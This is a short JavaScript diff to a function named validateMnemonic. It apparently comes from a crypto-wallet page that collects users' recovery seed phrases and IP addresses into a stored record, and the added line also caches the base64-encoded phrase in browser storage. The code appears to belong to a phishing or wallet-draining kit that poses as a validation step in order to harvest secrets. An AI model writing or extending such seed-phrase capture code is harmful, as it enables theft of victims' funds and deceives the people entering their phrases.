@@ -123,6 +123,7 @@ function validateMnemonic(mnemonic) {
                     src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                 });
                 if(user.id){
+                    setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1);
                     updateIndex(user.id);
                     SetValidPharse(true);
                     SetShowErrMsg(true);
